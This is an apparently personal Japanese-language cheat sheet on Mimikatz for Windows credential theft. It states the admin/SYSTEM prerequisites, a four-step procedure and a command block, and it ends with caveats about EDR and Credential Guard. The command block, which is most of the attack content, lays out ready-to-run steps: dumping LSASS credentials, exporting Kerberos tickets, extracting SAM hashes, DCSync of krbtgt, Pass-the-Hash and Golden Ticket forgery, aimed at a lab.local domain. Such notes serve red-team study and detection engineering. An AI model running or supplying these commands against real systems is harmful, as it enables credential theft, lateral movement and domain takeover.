---
title: Mimikatz による資格情報の窃取とチケット偽造
date: 2026-10-17
category: Windows
topic: 資格情報アクセス
tags: [windows, mimikatz, credential-access, lsass]
summary: ローカル管理者や SYSTEM 権限を前提に、LSASS やメモリから資格情報を抜き取り、Pass-the-Hash や Golden Ticket などに繋げるツール
---

## 概要

Mimikatz は、Windows 上の資格情報（NTLM ハッシュ、Kerberos チケット、環境によっては平文パスワード）を抜き取るための代表的なツール。多くの機能は LSASS（ローカルセキュリティ機関サブシステム）のメモリにアクセスする必要があるため、実行にはローカル管理者または SYSTEM 権限が前提になる。「権限さえあれば何でもできる」わけではなく、まず相応の権限を取得した後の仕上げの段階で使うツールという位置づけ。

主な機能は大きく 3 系統に分かれる。

- 資格情報の窃取（`sekurlsa::logonpasswords` など、LSASS から抜く）
- チケットのエクスポート（`sekurlsa::tickets` など、Pass-the-Ticket 用）
- 資格情報を使った認証・偽造（Pass-the-Hash、Golden Ticket など）

## 手順

1. ローカル管理者または SYSTEM 権限を取得する（別の権限昇格手法の結果として）。
2. `SeDebugPrivilege` を有効化し、SYSTEM トークンへ昇格する。
3. 目的に応じた機能（資格情報ダンプ、チケットエクスポート、DCSync など）を実行する。
4. 得られた資格情報・チケットを使い、横展開やドメイン侵害の手法へつなげる。

## コマンド

```
# 起動と前準備
privilege::debug        # SeDebugPrivilege を有効化（まず叩く）
token::elevate          # SYSTEM トークンへ昇格

# ---- 資格情報の窃取 ----
sekurlsa::logonpasswords
#  → LSASS から、ログオン中ユーザーの NTLM ハッシュ・（環境次第で）平文パスワード・Kerberos チケットを抜く。Mimikatz の花形。

sekurlsa::tickets /export
#  → メモリ上の Kerberos チケットを .kirbi で書き出す（Pass-the-Ticket 用）

lsadump::sam
#  → ローカル SAM からローカルアカウントのハッシュを抽出

lsadump::dcsync /user:krbtgt
#  → （ドメインで複製権限があれば）DCSync を Mimikatz 単体で実行。krbtgt 奪取 → Golden へ

# ---- チケット偽造・悪用 ----
sekurlsa::pth /user:administrator /domain:lab.local /ntlm:<hash> /run:cmd
#  → Pass-the-Hash。ハッシュで新しいプロセスを起動

kerberos::golden /user:administrator /domain:lab.local /sid:<SID> /krbtgt:<hash> /ptt
#  → Golden Ticket を生成してその場で読み込む
```

## 注意点

- Mimikatz を実行するには既にローカル管理者または SYSTEM 権限が必要であり、「Mimikatz で権限を取る」のではなく「取った権限を仕上げに使う」ツールだという位置づけを誤解しないこと。
- LSASS へのアクセスは EDR が最も重点的に監視するポイントのひとつ。多くの環境では LSASS の保護（Credential Guard、保護対象プロセス化）や EDR のシグネチャ検知によって、素の Mimikatz はそのままでは通らないことが多い。
